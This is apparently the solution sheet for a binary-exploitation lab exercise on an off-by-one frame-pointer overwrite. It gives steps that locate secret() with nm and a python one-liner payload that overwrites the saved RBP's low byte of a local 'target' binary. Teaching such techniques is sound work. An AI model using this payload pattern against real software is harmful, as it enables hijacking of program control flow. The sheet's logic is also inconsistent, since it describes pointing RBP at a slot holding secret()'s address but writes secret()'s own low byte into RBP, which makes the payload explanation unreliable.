Solution — Exercise 03: Off-by-One
=====================================

Step 1: Find secret()'s address
  nm target | grep secret
  → e.g. 0x0000000000401136 T secret
  The LSB is 0x36.

Step 2: Understand the corruption
  The 17th byte overwrites the LSB of the saved RBP.
  When main() executes its 'leave', it loads the corrupted RBP.
  Its following 'ret' reads a return address from a shifted
  stack location — which you can arrange to hold secret()'s address.

Step 3: Send the payload
  python3 -c "
  import sys
  sys.stdout.buffer.write(b'A' * 16 + bytes([0x36]))
  " | ./target

  The exact byte depends on your binary. Try the LSB of secret().

Step 4: If it doesn't work
  The stack layout varies by compiler. Use gdb to find where
  the pivoted frame's return address lands, and what value it
  needs to hold.

Why it works:
  Off-by-one errors are among the most common bugs in C.
  A single misplaced byte can corrupt control flow entirely.
